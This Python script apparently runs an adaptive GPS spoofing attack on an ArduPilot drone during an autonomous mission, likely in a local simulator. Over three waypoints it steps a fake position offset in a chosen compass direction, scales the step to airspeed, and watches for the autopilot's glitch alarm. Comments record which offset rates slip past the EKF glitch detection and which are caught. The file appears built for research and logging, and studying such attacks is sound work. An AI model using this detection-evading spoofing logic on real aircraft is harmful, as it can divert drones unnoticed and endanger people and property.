import time
import math
from controller.glitch_controller import GlitchController
from gps_reader.gps_reader import GPSReader
from monitor.flight_monitor import FlightMonitor
from utils.geo_utils import distance
from utils.logger import FlightLogger

import threading
import csv
from datetime import datetime

print("Connecting to ArduPilot...")

glitch = GlitchController()
gps = GPSReader()
gps_log = GPSReader(connection="udp:127.0.0.1:14547")
monitor = FlightMonitor()

# VARIABLES

x_glitch = 0.0000  # Imposta il glitch costante

x_glitch_increment = 0.00001  # Incremento del glitch per ogni ciclo (in gradi decimali)

# OK FUNZIONA CON 0.00001 OGNI 1 SEC
# OK FUNZIONA CON 0.000015 OGNI 1 SEC --> PRIMA VOLTA ERRORI AP: EKF3 lane switch 1 / AP: EKF3 primary changed:1 -- DOPO PIÙ NIENTE
# NON FUNZIONA CON 0.00002 OGNI 1 SEC -- GLITCH RILEVATO SUBITO DA AP: GPS Glitch or Compass error

# IMPLEMENTARE MOVIMENTO A SCELTA SUD, NORD, EST, OVEST, SUD-EST, SUD-OVEST, NORD-EST, NORD-OVEST

y_glitch = 0.0000  # Imposta il glitch costante

y_glitch_increment = 0.00001  # Incremento del glitch per ogni ciclo (in gradi decimali)

speed_reached = False

land_wp = monitor.get_land_waypoint_seq()  # Ottieni l'indice del waypoint di atterraggio

glitch_detected = False

current_waypoint_seq = None
    
current_waypoint_position = None

current_gps_position = None

distance_to_next_wp = None

current_airspeed = 0

log = None

logging_active = True

def log_position():
    
    while logging_active:

        position = gps_log.get_position()

        log.log(
            position,
            x_glitch,
            y_glitch
        )

        time.sleep(0.5)  # Logga la posizione ogni mezzo secondo
        
logger_thread = threading.Thread(
    target=log_position,
    daemon=True
)

def reset_variables_for_next_waypoint():
    global speed_reached, glitch_detected, current_waypoint_seq, current_waypoint_position, current_gps_position, distance_to_next_wp, current_airspeed
    
    current_airspeed = 0
    
    speed_reached = False
    
    current_waypoint_seq = monitor.get_current_waypoint_seq()  # Ottieni l'indice del waypoint corrente
        
    current_waypoint_position = monitor.get_current_waypoint_position()  # Ottieni la posizione del waypoint corrente
    
    current_gps_position = gps.get_raw_gps()  # Ottieni la posizione GPS corrente
    
    distance_to_next_wp = distance(
        current_waypoint_position['lat'],
        current_waypoint_position['lon'],
        current_gps_position['lat'],
        current_gps_position['lon']
    )

def adjust_glitch_increment(airspeed):
    """
    Regola l'incremento del glitch in base alla velocità aerea corrente.
    a 10 m/s incrementa di 0.00005, le altre velocità rapportate
    """
    print(f"Current airspeed: {airspeed} m/s")
    
    if airspeed is None:
        return 0

    airspeed = math.floor(airspeed)

    if airspeed <= 2:
        return 0
    
    return 0.00005 * (airspeed / 10)  # Incremento proporzionale alla velocità aerea

def check_glitch_detection():
    """
    Controlla se il glitch è stato rilevato dal drone.
    """
    if monitor.get_statustext_events(["AP: GPS Glitch or Compass error"]):
        print(f"Glitch detected with x_glitch = {x_glitch}")
        return True
    return False

def spoof_to_direction(direction):
    """
    Imposta il glitch in base alla direzione scelta.
    """
    global x_glitch_increment, y_glitch_increment, log
    
    match direction:
        case "0":  # NESSUNA DIREZIONE
            print("No direction selected")
            x_glitch_increment = 0
            y_glitch_increment = 0
            log = FlightLogger("logs/adaptive_no_direction_glitch.csv")
        case "1":  # NORD
            print("NORD direction selected")
            x_glitch_increment = -0.00001
            y_glitch_increment = 0
            log = FlightLogger("logs/adaptive_nord_glitch.csv")
        case "5":  # SUD
            print("SUD direction selected")
            x_glitch_increment = 0.00001
            y_glitch_increment = 0
            log = FlightLogger("logs/adaptive_sud_glitch.csv")
        case "3":  # EST
            print("EST direction selected")
            x_glitch_increment = 0
            y_glitch_increment = -0.00001
            log = FlightLogger("logs/adaptive_est_glitch.csv")
        case "7":  # OVEST
            print("WEST direction selected")
            x_glitch_increment = 0
            y_glitch_increment = 0.00001
            log = FlightLogger("logs/adaptive_ovest_glitch.csv")
        case "2":  # NORD-EST
            print("NORD-EST direction selected")
            x_glitch_increment = -0.00001
            y_glitch_increment = -0.00001
            log = FlightLogger("logs/adaptive_nord_est_glitch.csv")
        case "8":  # NORD-OVEST
            print("NORD-WEST direction selected")
            x_glitch_increment = -0.00001
            y_glitch_increment = 0.00001
            log = FlightLogger("logs/adaptive_nord_ovest_glitch.csv")
        case "4":  # SUD-EST
            print("SUD-EST direction selected")
            x_glitch_increment = 0.00001
            y_glitch_increment = -0.00001
            log = FlightLogger("logs/adaptive_sud_est_glitch.csv")
        case "6":  # SUD-OVEST
            print("SUD-WEST direction selected")
            x_glitch_increment = 0.00001
            y_glitch_increment = 0.00001
            log = FlightLogger("logs/adaptive_sud_ovest_glitch.csv")
        case _:
            print("Invalid choice")
            raise SystemExit(1)

choice = input("\n" +
    "   NORD          NORD (1)     NORD\n" +
    "   WEST (8)                  EST (2) \n" +
    "  -----------  ⇖   ⇑   ⇗   -----------\n" +
    "   WEST (7)    ⇐       ⇒     EST (3) \n" +
    "  -----------  ⇙   ⇓   ⇘   -----------\n" +
    "   SUD (6)                    SUD (4) \n" +
    "   WEST          SUD (5)     EST     \n\n" +
    "Choose glitch direction: "
).strip()

spoof_to_direction(choice)  # Imposta l'incremento del glitch in base alla direzione scelta

# INIZIO MAIN

try:

    monitor.wait_for_mode("AUTO")
    
    logger_thread.start()  # Avvia il thread del logger

    time.sleep(5)  # Attendi 5 secondi prima di iniziare l'attacco

    ###################################
    #        FIRST WAYPOINT           #
    ###################################

    print("Glitch first waypoint")
    
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il primo waypoint

    while not (current_airspeed < 2 and speed_reached) and not glitch_detected and distance_to_next_wp > 50:  # Limite massimo del glitch
        
        # Airspeed section
        
        current_airspeed = monitor.get_current_air_speed()
        
        if current_airspeed >= 2:
            speed_reached = True  # La velocità aerea è stata raggiunta almeno una volta
            
        # Glitch adjustment section
        
        x_glitch += x_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        y_glitch += y_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        glitch.set_glitch(x_glitch, y_glitch)
        
        print(f"Current value of x_glitch: {x_glitch}")
        print(f"Current value of y_glitch: {y_glitch}")
        
        # Glitch detection section
        
        if check_glitch_detection():
            glitch_detected = True
            break
        
        # Distance check section
        
        current_gps_position = gps.get_raw_gps()
        
        distance_to_next_wp = distance(
            current_waypoint_position['lat'],
            current_waypoint_position['lon'],
            current_gps_position['lat'],
            current_gps_position['lon']
        )
        
        time.sleep(1)
        
    print("Current airspeed too low or next waypoint is close, stopping glitching")
        
    print("Waiting for second waypoint")
        
    monitor.wait_for_next_waypoint(current_waypoint_seq)  # Attendi il passaggio al secondo waypoint

    ###################################
    #        SECOND WAYPOINT          #
    ###################################
        
    print("Glitch second waypoint")
    
    # Reset variabili
    
    print("Resetting variables for the second waypoint")
        
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il secondo waypoint
        
    while not (current_airspeed < 2 and speed_reached) and not glitch_detected and distance_to_next_wp > 50:  # Limite massimo del glitch
        
        # Airspeed section
                
        current_airspeed = monitor.get_current_air_speed()
        
        if current_airspeed >= 2:
            speed_reached = True  # La velocità aerea è stata raggiunta almeno una volta
            
        # Glitch adjustment section
        
        x_glitch += x_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        y_glitch += y_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        glitch.set_glitch(x_glitch, y_glitch)
        
        print(f"Current value of x_glitch: {x_glitch}")
        print(f"Current value of y_glitch: {y_glitch}")
        
        # Glitch detection section
        
        if check_glitch_detection():
            glitch_detected = True
            break
        
        # Distance check section
        
        current_gps_position = gps.get_raw_gps()
        
        distance_to_next_wp = distance(
            current_waypoint_position['lat'],
            current_waypoint_position['lon'],
            current_gps_position['lat'],
            current_gps_position['lon']
        )
        
        time.sleep(1)
    
    print("Current airspeed too low or next waypoint is close, stopping glitching")
        
    print("Waiting for third waypoint")
        
    monitor.wait_for_next_waypoint(current_waypoint_seq)  # Attendi il passaggio al terzo waypoint

    ###################################
    #        THIRD WAYPOINT           #
    ###################################

    print("Glitch third waypoint")
    
    # Reset variabili
    
    print("Resetting variables for the third waypoint")
    
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il terzo waypoint
        
    while not (current_airspeed < 2 and speed_reached) and not glitch_detected and distance_to_next_wp > 50:  # Limite massimo del glitch
        
        # Airspeed section
                
        current_airspeed = monitor.get_current_air_speed()
        
        if current_airspeed >= 2:
            speed_reached = True  # La velocità aerea è stata raggiunta almeno una volta
            
        # Glitch adjustment section
        
        x_glitch += x_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        y_glitch += y_glitch_increment  # Incrementa il glitch per il prossimo ciclo
        
        glitch.set_glitch(x_glitch, y_glitch)
        
        print(f"Current value of x_glitch: {x_glitch}")
        print(f"Current value of y_glitch: {y_glitch}")
        
        # Glitch detection section
        
        if check_glitch_detection():
            glitch_detected = True
            break
        
        # Distance check section
        
        current_gps_position = gps.get_raw_gps()
        
        distance_to_next_wp = distance(
            current_waypoint_position['lat'],
            current_waypoint_position['lon'],
            current_gps_position['lat'],
            current_gps_position['lon']
        )
        
        time.sleep(1)
        
    print("Waiting for landing")
    
    reset_variables_for_next_waypoint()  # Inizializza le variabili per il landing waypoint

    monitor.wait_for_next_waypoint(current_waypoint_seq)  # Attendi il passaggio al landing waypoint
        
    print("Landing waypoint reached")

    time.sleep(10)  # Attendi 10 secondi che atterri prima di resettare il glitch
    
finally:
    print("\nReset glitch...")
    
    glitch.reset()
    
    x_glitch = 0.0000
    y_glitch = 0.0000
    
    time.sleep(30)  # Attendi 30 secondi prima di chiudere il log
    
    print("\nStopping logging...")

    logging_active = False

    # Aspetta che il logger finisca il ciclo corrente
    logger_thread.join(timeout=2)

    print("Logging stopped. Program finished.")